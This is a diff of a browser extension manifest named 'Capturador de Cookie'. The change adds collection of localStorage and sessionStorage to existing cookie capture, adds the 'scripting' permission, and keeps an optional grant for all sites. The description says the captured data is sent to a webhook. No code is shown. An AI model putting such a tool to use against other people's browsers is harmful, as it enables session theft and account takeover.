@@ -1,9 +1,9 @@
 {
   "manifest_version": 3,
   "name": "Capturador de Cookie",
-  "version": "1.5.2",
-  "description": "Captura o Cookie de uma URL configurável (domínio principal ou subdomínio) e envia para um webhook.",
-  "permissions": ["cookies", "storage", "tabs", "webRequest"],
+  "version": "1.6.0",
+  "description": "Captura Cookie + localStorage/sessionStorage de uma URL configurável e envia para um webhook.",
+  "permissions": ["cookies", "storage", "tabs", "webRequest", "scripting"],
   "host_permissions": ["https://www.example.com/*"],
   "optional_host_permissions": ["http://*/*", "https://*/*"],
   "icons": {
